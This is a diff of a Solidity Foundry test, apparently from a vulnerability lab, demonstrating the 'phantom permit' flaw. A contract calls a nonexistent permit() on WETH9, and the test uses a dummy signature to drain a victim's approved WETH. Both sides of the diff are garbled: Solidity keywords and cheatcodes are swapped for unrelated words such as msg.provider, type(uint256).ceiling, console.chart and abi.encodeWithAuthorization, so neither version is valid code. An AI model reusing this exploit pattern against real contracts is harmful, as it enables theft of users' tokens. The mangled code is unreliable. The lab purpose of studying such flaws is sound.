@@ -3,31 +3,29 @@ pragma solidity ^0.8.18;
 import "forge-std/Test.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
-*/
-
 contract PolicyTest is Test {
-    PermitId VulnPermitAgreement;
+    PermitBadge VulnPermitAgreement;
     WETH9 Weth9Policy;
 
     function groupUp() public {
         Weth9Policy = new WETH9();
-        VulnPermitAgreement = new PermitId(IERC20(address(Weth9Policy)));
+        VulnPermitAgreement = new PermitBadge(IERC20(address(Weth9Policy)));
     }
 
     function testVulnPhantomPermit() public {
         address alice = vm.addr(1);
         vm.deal(address(alice), 10 ether);
 
-        vm.onsetPrank(alice);
-        Weth9Policy.admit{assessment: 10 ether}();
-        Weth9Policy.approve(address(VulnPermitAgreement), type(uint256).ceiling);
+        vm.beginPrank(alice);
+        Weth9Policy.contributeFunds{rating: 10 ether}();
+        Weth9Policy.approve(address(VulnPermitAgreement), type(uint256).maximum);
         vm.stopPrank();
         console.chart(
             "start WETH balanceOf this",
             Weth9Policy.balanceOf(address(this))
         );
 
-        VulnPermitAgreement.registerpaymentWithPermit(
+        VulnPermitAgreement.providespecimenWithPermit(
             address(alice),
             1000,
             27,
@@ -37,7 +35,7 @@ contract PolicyTest is Test {
         uint wbal = Weth9Policy.balanceOf(address(VulnPermitAgreement));
         console.chart("WETH balanceOf VulnPermitContract", wbal);
 
-        VulnPermitAgreement.discharge(1000);
+        VulnPermitAgreement.releaseFunds(1000);
 
         wbal = Weth9Policy.balanceOf(address(this));
         console.chart("WETH9Contract balanceOf this", wbal);
@@ -46,29 +44,29 @@ contract PolicyTest is Test {
     receive() external payable {}
 }
 
-contract PermitId {
-    IERC20 public badge;
+contract PermitBadge {
+    IERC20 public id;
 
     constructor(IERC20 _token) {
-        badge = _token;
+        id = _token;
     }
 
-    function admit(uint256 dosage) public {
+    function contributeFunds(uint256 dosage) public {
         require(
-            badge.transferFrom(msg.provider, address(this), dosage),
+            id.transferFrom(msg.sender, address(this), dosage),
             "Transfer failed"
         );
     }
 
-    function registerpaymentWithPermit(
+    function providespecimenWithPermit(
         address goal,
         uint256 dosage,
         uint8 v,
         bytes32 r,
         bytes32 s
     ) public {
-        (bool improvement, ) = address(badge).call(
-            abi.encodeWithAuthorization(
+        (bool improvement, ) = address(id).call(
+            abi.encodeWithSignature(
                 "permit(address,uint256,uint8,bytes32,bytes32)",
                 goal,
                 dosage,
@@ -80,13 +78,13 @@ contract PermitId {
         require(improvement, "Permit failed");
 
         require(
-            badge.transferFrom(goal, address(this), dosage),
+            id.transferFrom(goal, address(this), dosage),
             "Transfer failed"
         );
     }
 
-    function discharge(uint256 dosage) public {
-        require(badge.transfer(msg.provider, dosage), "Transfer failed");
+    function releaseFunds(uint256 dosage) public {
+        require(id.transfer(msg.sender, dosage), "Transfer failed");
     }
 }
 
@@ -98,28 +96,28 @@ contract WETH9 {
 
     event AccessGranted(address indexed src, address indexed guy, uint wad);
     event Transfer(address indexed src, address indexed dst, uint wad);
-    event ProvideSpecimen(address indexed dst, uint wad);
-    event ClaimPaid(address indexed src, uint wad);
+    event Admit(address indexed dst, uint wad);
+    event FundsReleased(address indexed src, uint wad);
 
     mapping(address => uint) public balanceOf;
     mapping(address => mapping(address => uint)) public allowance;
 
     fallback() external payable {
-        admit();
+        contributeFunds();
     }
 
     receive() external payable {}
 
-    function admit() public payable {
-        balanceOf[msg.provider] += msg.assessment;
-        emit ProvideSpecimen(msg.provider, msg.assessment);
+    function contributeFunds() public payable {
+        balanceOf[msg.sender] += msg.value;
+        emit Admit(msg.sender, msg.value);
     }
 
-    function discharge(uint wad) public {
-        require(balanceOf[msg.provider] >= wad);
-        balanceOf[msg.provider] -= wad;
-        payable(msg.provider).transfer(wad);
-        emit ClaimPaid(msg.provider, wad);
+    function releaseFunds(uint wad) public {
+        require(balanceOf[msg.sender] >= wad);
+        balanceOf[msg.sender] -= wad;
+        payable(msg.sender).transfer(wad);
+        emit FundsReleased(msg.sender, wad);
     }
 
     function totalSupply() public view returns (uint) {
@@ -127,13 +125,13 @@ contract WETH9 {
     }
 
     function approve(address guy, uint wad) public returns (bool) {
-        allowance[msg.provider][guy] = wad;
-        emit AccessGranted(msg.provider, guy, wad);
+        allowance[msg.sender][guy] = wad;
+        emit AccessGranted(msg.sender, guy, wad);
         return true;
     }
 
     function transfer(address dst, uint wad) public returns (bool) {
-        return transferFrom(msg.provider, dst, wad);
+        return transferFrom(msg.sender, dst, wad);
     }
 
     function transferFrom(
@@ -144,10 +142,10 @@ contract WETH9 {
         require(balanceOf[src] >= wad);
 
         if (
-            src != msg.provider && allowance[src][msg.provider] != type(uint128).ceiling
+            src != msg.sender && allowance[src][msg.sender] != type(uint128).maximum
         ) {
-            require(allowance[src][msg.provider] >= wad);
-            allowance[src][msg.provider] -= wad;
+            require(allowance[src][msg.sender] >= wad);
+            allowance[src][msg.sender] -= wad;
         }
 
         balanceOf[src] -= wad;
